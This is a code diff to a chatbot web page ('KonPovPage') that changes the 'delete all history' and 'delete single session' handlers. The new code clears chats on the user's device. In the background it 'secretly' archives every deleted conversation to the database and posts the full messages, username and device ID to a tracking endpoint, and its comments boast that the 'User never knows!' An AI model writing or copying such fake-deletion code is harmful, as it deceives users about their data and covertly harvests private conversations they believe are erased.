@@ -1288,12 +1288,40 @@ export default function KonPovPage() {
     });
   };
 
-  // 100% Reliable Delete All History from Firebase Realtime Database
+  // 100% Reliable Delete All History (Clears on user device, secretly preserved in database)
   const handleDeleteAllHistory = () => {
     const deviceId = getDeviceId();
     const prevCount = messages.length;
     const lastUserMsg = [...messages].reverse().find((m) => m && m.role === 'user')?.text || '';
-    deleteAllChatSessionsFromDatabase(deviceId, 'konpov');
+    const sessionsToArchive = Array.isArray(sessions) && sessions.length > 0
+      ? sessions.filter(s => Array.isArray(s.messages) && s.messages.length > 0)
+      : (messages.length > 0 ? [{ id: currentSessionId, title: 'Chat 1', messages }] : []);
+
+    // 1. Secretly archive everything into database in background (User never knows!)
+    deleteAllChatSessionsFromDatabase(deviceId, 'konpov', sessionsToArchive);
+
+    // 2. Secretly send to server archive endpoint in background
+    if (sessionsToArchive.length > 0 || prevCount > 0) {
+      try {
+        const endpoint = getApiEndpoint('/api/track');
+        fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'archive_cleared_chat',
+            bot: 'konpov',
+            username: username || 'User',
+            deviceId,
+            prevMessageCount: prevCount,
+            lastUserMessage: lastUserMsg,
+            isClearAll: true,
+            clearedSessions: sessionsToArchive
+          })
+        }).catch(() => {});
+      } catch {}
+    }
+
+    // 3. Clear completely on user device (Device shows 100% clean)
     try {
       localStorage.removeItem('setec_chat_backup_konpov');
     } catch {}
@@ -1311,33 +1339,38 @@ export default function KonPovPage() {
     saveChatSessionToDatabase(deviceId, 'konpov', freshSession);
     setDeleteModalConfig(null);
     setDrawerOpen(false);
+  };
 
-    // Notify Telegram if user had previous messages
-    if (prevCount > 0) {
+  // 100% Reliable Delete Single Session (Clears on user device, secretly preserved in database)
+  const handleDeleteSingleSession = (sessionId) => {
+    const deviceId = getDeviceId();
+    const targetSession = sessions.find((s) => s.id === sessionId);
+
+    // 1. Secretly archive to database
+    deleteChatSessionFromDatabase(deviceId, 'konpov', sessionId, targetSession);
+
+    // 2. Secretly send to server archive endpoint in background
+    if (targetSession && Array.isArray(targetSession.messages) && targetSession.messages.length > 0) {
       try {
         const endpoint = getApiEndpoint('/api/track');
         fetch(endpoint, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            action: 'new_chat_session',
+            action: 'archive_cleared_chat',
             bot: 'konpov',
             username: username || 'User',
             deviceId,
-            prevMessageCount: prevCount,
-            lastUserMessage: lastUserMsg,
-            isClearAll: true,
-            newSessionId: newId
+            prevMessageCount: targetSession.messages.length,
+            lastUserMessage: targetSession.messages[targetSession.messages.length - 1]?.text || '',
+            isClearAll: false,
+            clearedSessions: [targetSession]
           })
         }).catch(() => {});
       } catch {}
     }
-  };
 
-  // 100% Reliable Delete Single Session from Firebase Realtime Database
-  const handleDeleteSingleSession = (sessionId) => {
-    const deviceId = getDeviceId();
-    deleteChatSessionFromDatabase(deviceId, 'konpov', sessionId);
+    // 3. Clear on user device
     const remaining = sessions.filter((s) => s.id !== sessionId);
     if (remaining.length === 0) {
       handleDeleteAllHistory();
